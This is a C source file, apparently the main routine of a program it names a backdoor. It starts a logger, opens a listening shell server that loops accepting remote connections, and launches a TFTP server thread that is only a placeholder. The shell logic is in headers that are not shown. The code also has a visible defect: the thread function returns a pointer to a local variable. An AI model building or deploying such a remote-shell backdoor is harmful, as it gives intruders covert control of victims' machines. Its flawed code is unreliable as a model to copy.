#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <assert.h>

#include "common.h"
#include "shell.h"
#include "logger.h"
#include "tftp.h"
#include "backdoor.h"

#define PTHREAD_CREATE_SUCCESS (0)

typedef struct start_tftp_server_args_s {
    logger__log_t *logger;
    int32_t tftp_server_socket;
} start_tftp_server_args_t;

static void *start_tftp_server(void *arg)
{
    assert(arg != NULL);
    return_code_t result = RC_UNINITIALIZED;
    start_tftp_server_args_t *start_tftp_args = arg;

    while(true){
        sleep(5);
        logger__log(start_tftp_args->logger, LOG_INFO, "In tftp thread.");
    }

    result = RC_SUCCESS;
l_cleanup:
    return &result;
}

static return_code_t run_shell_server(int32_t shell_server_socket, logger__log_t *logger)
{
    assert(logger != NULL);
    return_code_t result = RC_UNINITIALIZED;

    while (true){
        result = shell__handle_new_connection(shell_server_socket, logger);
        if (RC_SUCCESS != result){
            break;
        }
    }

l_cleanup:
    return result;
}

int main(void)
{
    return_code_t result = RC_UNINITIALIZED;
    logger__log_t logger = {0};
    int32_t shell_server = -1;
    int32_t tftp_server = -1;
    pthread_t tftp_tid = 0;
    int32_t temp_result = -1;
    start_tftp_server_args_t start_tftp_args = {0};

    result = logger__init_logger(LOG_PATH, &logger);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = shell__init_server(SHELL_LISTENING_PORT, &logger, &shell_server);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    result = tftp__init_server(TFTP_REQUESTS_PORT, &logger, &tftp_server);
    if (RC_SUCCESS != result){
        goto l_cleanup;
    }

    start_tftp_args.logger = &logger;
    start_tftp_args.tftp_server_socket = tftp_server;
    temp_result = pthread_create(&tftp_tid, NULL, &start_tftp_server, &start_tftp_args);
    if (PTHREAD_CREATE_SUCCESS != temp_result){
        handle_perror("Pthread create failed", RC_BACKDOOR__MAIN__PTHREAD_CREATE_FAILED);
    }

    result = run_shell_server(shell_server, &logger);

l_cleanup:
    shell__destroy_server(&shell_server, &logger);
    tftp__destroy_server(&tftp_server, &logger);
    logger__destory_logger(&logger);
    
    return (int)result;
}
